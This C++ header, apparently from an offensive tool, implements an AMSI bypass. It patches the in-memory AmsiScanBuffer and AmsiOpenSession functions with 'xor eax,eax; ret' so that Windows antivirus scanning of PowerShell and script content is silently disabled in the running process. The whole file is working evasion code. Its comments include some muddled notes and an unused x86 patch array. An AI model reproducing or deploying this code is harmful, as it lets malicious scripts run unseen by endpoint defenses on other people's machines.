#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <cstdint>
#include <cstring>

namespace nuub::domain {

// Patch AMSI to prevent scanning of PowerShell/Script content
class AmsiBypass {
public:
    // Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
    // This disables AMSI scanning for the current process
    static bool patch() {
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;

        // Resolve AmsiScanBuffer
        auto AmsiScanBuffer = reinterpret_cast<void*>(
            GetProcAddress(hAmsi, "AmsiScanBuffer"));
        if (!AmsiScanBuffer) return false;

        // Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
        // AmsiScanBuffer returns this for invalid args, AV ignores the result
        // Alternative: xor eax,eax ; ret (S_OK = clean)
        unsigned char patch[] = {
            0x33, 0xC0,  // xor eax, eax
            0xC2, 0x18, 0x00  // ret 0x18 (stdcall, 6 args * 8 bytes on x64... actually ret N)
        };

        // x64: ret with stack cleanup for the 6 params (each 8 bytes = 0x30)
        // Actually AmsiScanBuffer has 6 params: hamsiContext, buffer, length, contentName, appName, result
        // On x64 Windows calling convention, callee doesn't clean stack, so just: xor eax,eax ; ret
        unsigned char patch_x64[] = {
            0x33, 0xC0,  // xor eax, eax  (S_OK)
            0xC3         // ret
        };

        DWORD old_protect = 0;
        if (!VirtualProtect(AmsiScanBuffer, sizeof(patch_x64),
                            PAGE_EXECUTE_READWRITE, &old_protect)) {
            return false;
        }

        memcpy(AmsiScanBuffer, patch_x64, sizeof(patch_x64));

        VirtualProtect(AmsiScanBuffer, sizeof(patch_x64),
                       old_protect, &old_protect);

        return true;
    }

    // Also patch AmsiOpenSession to prevent session-based scanning
    static bool patch_open_session() {
        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
        if (!hAmsi) return false;

        auto AmsiOpenSession = reinterpret_cast<void*>(
            GetProcAddress(hAmsi, "AmsiOpenSession"));
        if (!AmsiOpenSession) return false;

        unsigned char patch[] = {
            0x33, 0xC0,  // xor eax, eax
            0xC3         // ret
        };

        DWORD old_protect = 0;
        if (!VirtualProtect(AmsiOpenSession, sizeof(patch),
                            PAGE_EXECUTE_READWRITE, &old_protect)) {
            return false;
        }

        memcpy(AmsiOpenSession, patch, sizeof(patch));

        VirtualProtect(AmsiOpenSession, sizeof(patch),
                       old_protect, &old_protect);

        return true;
    }
};

} // namespace nuub::domain
#endif
